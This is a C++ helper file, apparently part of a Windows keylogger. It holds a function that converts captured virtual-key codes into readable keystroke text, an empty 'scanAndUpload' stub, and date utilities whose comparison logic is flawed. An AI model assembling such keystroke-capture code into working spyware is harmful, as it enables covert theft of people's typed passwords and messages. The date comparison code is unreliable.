/*
 * klgr_helper.cpp
 *
 *  Created on: Nov 20, 2016
 *      Author: Kishore
 */

#include <windows.h>
#include <string>
#include <cstdlib>
#include <time.h>
#include <iostream>
using namespace std;

time_t timeNow()
{
	return time(NULL);
}

void scanAndUpload(char path[])
{

}

string getStringDateTime(string info)
{
	time_t crtm = timeNow();
	tm * timeInfo = localtime(&crtm );
	char timeStr[80];

	if(info.compare("date") == 0)
		strftime(timeStr,80,"%Y-%m-%d", timeInfo);
	else
	{
		if (info == "time")
			strftime(timeStr,80,"%I:%M:%S%p", timeInfo);
		else
			strftime(timeStr,80,"%Y-%m-%d %H:%M:%S", timeInfo);
	}
	return timeStr;
}

int compareDates(string date1, string date2)
{
	cout << "Date 1 :" << date1 << "  Date 2 :" << date2 <<endl;

	if(atoi(date1.substr(0,4).c_str()) < atoi(date2.substr(0,4).c_str()))
		return 1;

	if(atoi(date1.substr(5,2).c_str()) < std::atoi(date2.substr(5,2).c_str()))
		return 1;

	if(atoi(date1.substr(8,2).c_str()) < atoi(date2.substr(8,2).c_str()))
		return 1;

	return 0;
}

string decodeKeys(DWORD vkCode,bool caps,bool shift,bool ctrl,bool alt){
	string curr_key;
	// Check for key combination.


	// Alphabets and NumberPad
	if((vkCode >= 0x41 && vkCode <= 0x5A )||(vkCode >= 0x60 && vkCode <= 0x6F))
	{
		if(caps == shift)
			curr_key = char(tolower(vkCode));
		else
			curr_key = char(toupper(vkCode));
	}
	else
	{
		// Numbers and Special chars
		if (vkCode <=0x39 && vkCode >= 0x30)
		{
			if(!shift) // Print Numbers
				curr_key = char(tolower(vkCode));
			else // Print Symbol of number keys

				switch(char(tolower(vkCode)))
				{
				case '1': curr_key="!"; break;
				case '2': curr_key="@"; break;
				case '3': curr_key="#"; break;
				case '4': curr_key="$"; break;
				case '5': curr_key="%"; break;
				case '6': curr_key="^"; break;
				case '7': curr_key="&"; break;
				case '8': curr_key="*"; break;
				case '9': curr_key="("; break;
				case '0': curr_key=")"; break;
				}
		}
		else
		{
			switch(vkCode)
			{
			case 8: curr_key=" <backspace> ";
					break;

				case 9: curr_key=" <tab> ";
					break;

				case 13: curr_key=" <enter> ";
					break;

				case 14: curr_key=" <shift-in> ";
					break;

				case 19: curr_key=" <pause> ";
					break;

				case 20: curr_key=" <capslock> ";
					break;

				case 27: curr_key=" <esc> ";
					break;

				case 32: curr_key=" ";
					break;

				case 33: curr_key=" <pg-up> ";
					break;

				case 34: curr_key=" <pg-dn> ";
					break;

				case 35: curr_key=" <end> ";
					break;

				case 36: curr_key=" <home> ";
					break;

				case 37: curr_key=" <left> ";
					break;

				case 38: curr_key=" <up> ";
					break;

				case 39: curr_key=" <right> ";
					break;

				case 40: curr_key=" <down> ";
					break;

				case 44: curr_key=" <prnt-screen> ";
					break;

				case 45: curr_key=" <insert> ";
					break;

				case 46: curr_key=" <delete> ";
					break;

				case 91: curr_key=" <win key> ";
					break;

				case 93: curr_key=" <menu key> ";
					break;

				case 95: curr_key=" <sleep key> ";
					break;


				case 144: curr_key=" <num-lock> ";
					break;

				case 145: curr_key=" <scroll-lock> ";
					break;

				case 111: curr_key=shift? "?":"/"; //not working
					break;

				case 126: curr_key=shift? "~":"`";
					break;

				case 186: curr_key=shift? ":":";";
					break;

				case 189: curr_key=shift? "_":"-";
					break;

				case 188: curr_key=shift? "<":",";
					break;

				case 190: curr_key=shift? ">":".";
					break;

				case 187: curr_key=shift? "+":"=";
					break;

				case 191: curr_key=shift? "?":"/";
					break;

				case 192: curr_key=shift?"~":"`";
					break;

				case 219: curr_key=shift? "{":"[";
					break;

				case 221: curr_key=shift? "}":"]";
					break;

				case 220: curr_key=shift? "|":"\\";
					break;
				case 222: curr_key=shift? "\"":"\'";
				break;

				// Not sure what they are for
				case 60: curr_key="<";
					break;

				case 62: curr_key=">";
					break;

				case 63: curr_key="?";
					break;

				case 106: curr_key="*";
					break;

				case 107: curr_key="+";
					break;

				case 109: curr_key="-";
					break;

				case 110: curr_key=".";
					break;
			}
		}
	}
	if(ctrl)
	{
		curr_key = " <ctrl + " +curr_key + "> ";
	}
	return curr_key;
}
